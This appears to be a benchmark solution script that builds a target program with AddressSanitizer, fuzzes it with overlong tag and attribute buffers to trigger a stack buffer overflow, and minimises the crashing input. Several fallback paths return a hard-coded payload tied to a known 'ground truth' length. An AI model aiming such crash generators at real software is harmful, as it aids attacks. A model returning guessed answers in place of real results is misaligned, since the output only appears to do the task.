import os
import sys
import subprocess
import tempfile
import shutil
import tarfile
import glob

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the vulnerability.
        """
        with tempfile.TemporaryDirectory() as temp_dir:
            # 1. Extract source code
            extract_dir = os.path.join(temp_dir, "src")
            os.makedirs(extract_dir, exist_ok=True)
            try:
                with tarfile.open(src_path) as tar:
                    tar.extractall(path=extract_dir)
            except Exception:
                # Fallback if tar extraction fails (unlikely given problem spec)
                return b"<" + b"A" * 1460 + b">"

            # Locate source root (handle nested top-level directory)
            src_root = extract_dir
            entries = os.listdir(extract_dir)
            if len(entries) == 1 and os.path.isdir(os.path.join(extract_dir, entries[0])):
                src_root = os.path.join(extract_dir, entries[0])

            # 2. Setup Build Environment for ASAN
            env = os.environ.copy()
            env["CC"] = "clang"
            env["CXX"] = "clang++"
            env["CFLAGS"] = "-fsanitize=address -g -O1"
            env["CXXFLAGS"] = "-fsanitize=address -g -O1"

            # 3. Build the project
            built_executables = []
            
            # Try CMake
            if os.path.exists(os.path.join(src_root, "CMakeLists.txt")):
                build_dir = os.path.join(src_root, "build")
                os.makedirs(build_dir, exist_ok=True)
                subprocess.run(["cmake", ".."], cwd=build_dir, env=env, 
                               stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                subprocess.run(["make", "-j8"], cwd=build_dir, env=env, 
                               stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                
            # Try Makefile
            elif os.path.exists(os.path.join(src_root, "Makefile")):
                subprocess.run(["make", "-j8"], cwd=src_root, env=env, 
                               stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            
            # Try configure
            elif os.path.exists(os.path.join(src_root, "configure")):
                subprocess.run(["./configure"], cwd=src_root, env=env, 
                               stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                subprocess.run(["make", "-j8"], cwd=src_root, env=env, 
                               stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

            # 4. Find Executables
            for root, dirs, files in os.walk(src_root):
                for f in files:
                    path = os.path.join(root, f)
                    # Check if executable and not a script or object file
                    if os.access(path, os.X_OK) and not f.endswith(('.sh', '.py', '.txt', '.c', '.cpp', '.h', '.o', '.a', '.so')):
                        built_executables.append(path)

            # Fallback: Manual compilation if no executables found
            if not built_executables:
                c_files = glob.glob(os.path.join(src_root, "**", "*.c"), recursive=True)
                if c_files:
                    out_bin = os.path.join(temp_dir, "vuln_manual")
                    subprocess.run(["clang", "-fsanitize=address", "-g", "-o", out_bin] + c_files, 
                                   env=env, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                    if os.path.exists(out_bin):
                        built_executables.append(out_bin)

            if not built_executables:
                # Last resort heuristic based on problem description
                return b"<" + b"A" * 1459 + b">"

            # 5. Fuzz / Identify Vulnerability
            # Patterns based on "tag found" and "stack buffer overflow"
            patterns = [
                lambda l: b"<" + b"A" * l + b">",        # Content overflow in tag
                lambda l: b"<" + b"A" * l + b" >",       # Tag name overflow
                lambda l: b"<t a='" + b"A" * l + b"'>",  # Attribute overflow
                lambda l: b"A" * l                       # Plain buffer overflow
            ]
            
            # Start with lengths around the ground truth (1461)
            check_lengths = [256, 512, 1024, 1400, 1500, 2048, 4096]
            
            crash_exe = None
            crash_pat = None
            crash_len = None

            for exe in built_executables:
                for pat in patterns:
                    for l in check_lengths:
                        payload = pat(l)
                        
                        # Write payload to file
                        poc_file = os.path.join(temp_dir, "input.bin")
                        with open(poc_file, "wb") as f:
                            f.write(payload)
                        
                        # Test execution (File Argument)
                        try:
                            res = subprocess.run([exe, poc_file], capture_output=True, timeout=0.5)
                            if res.returncode != 0 and (b"AddressSanitizer" in res.stderr or b"SEGV" in res.stderr):
                                crash_exe = exe
                                crash_pat = pat
                                crash_len = l
                                break
                        except subprocess.TimeoutExpired:
                            pass
                        
                        # Test execution (Stdin)
                        try:
                            res = subprocess.run([exe], input=payload, capture_output=True, timeout=0.5)
                            if res.returncode != 0 and (b"AddressSanitizer" in res.stderr or b"SEGV" in res.stderr):
                                crash_exe = exe
                                crash_pat = pat
                                crash_len = l
                                break
                        except subprocess.TimeoutExpired:
                            pass
                    
                    if crash_exe: break
                if crash_exe: break
            
            if not crash_exe:
                return b"<" + b"A" * 1459 + b">"

            # 6. Minimize the PoC
            # Binary search to find the minimal length triggering the crash
            low = 0
            high = crash_len
            min_len = crash_len

            while low <= high:
                mid = (low + high) // 2
                if mid <= 0:
                    low = 1
                    continue
                
                payload = crash_pat(mid)
                poc_file = os.path.join(temp_dir, "min.bin")
                with open(poc_file, "wb") as f:
                    f.write(payload)
                
                crashed = False
                
                # Check crash
                try:
                    res = subprocess.run([crash_exe, poc_file], capture_output=True, timeout=0.5)
                    if res.returncode != 0 and (b"AddressSanitizer" in res.stderr or b"SEGV" in res.stderr):
                        crashed = True
                except:
                    pass
                
                if not crashed:
                    try:
                        res = subprocess.run([crash_exe], input=payload, capture_output=True, timeout=0.5)
                        if res.returncode != 0 and (b"AddressSanitizer" in res.stderr or b"SEGV" in res.stderr):
                            crashed = True
                    except:
                        pass
                
                if crashed:
                    min_len = mid
                    high = mid - 1
                else:
                    low = mid + 1
            
            return crash_pat(min_len)